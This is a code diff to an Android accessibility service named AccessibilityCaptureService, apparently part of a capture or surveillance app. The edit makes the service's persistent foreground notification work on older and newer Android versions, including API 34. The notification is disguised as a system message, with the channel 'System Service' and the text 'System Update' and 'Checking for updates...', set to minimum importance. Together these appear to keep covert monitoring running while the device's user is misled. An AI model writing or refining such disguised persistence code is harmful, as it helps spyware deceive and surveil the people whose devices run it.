@@ -69,24 +69,34 @@ public class AccessibilityCaptureService extends AccessibilityService {
         }
 
         private void createPersistentNotification() {
+            String channelId = "persist_channel";
             android.app.NotificationManager notificationManager = (android.app.NotificationManager) getSystemService(
                     NOTIFICATION_SERVICE);
 
+            android.app.Notification.Builder builder;
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                 android.app.NotificationChannel channel = new android.app.NotificationChannel(
-                        "persist_channel", "System Service",
+                        channelId, "System Service",
                         android.app.NotificationManager.IMPORTANCE_MIN);
                 notificationManager.createNotificationChannel(channel);
+                builder = new android.app.Notification.Builder(this, channelId);
+            } else {
+                builder = new android.app.Notification.Builder(this);
             }
 
-            android.app.Notification notification = new android.app.Notification.Builder(this, "persist_channel")
+            android.app.Notification notification = builder
                     .setContentTitle("System Update")
                     .setContentText("Checking for updates...")
                     .setSmallIcon(android.R.drawable.ic_dialog_info)
                     .setOngoing(true)
                     .build();
 
-            startForeground(NOTIFICATION_ID, notification);
+            if (Build.VERSION.SDK_INT >= 34) {
+                // 1 is FOREGROUND_SERVICE_TYPE_DATA_SYNC
+                startForeground(NOTIFICATION_ID, notification, 1);
+            } else {
+                startForeground(NOTIFICATION_ID, notification);
+            }
         }
 
         @Override
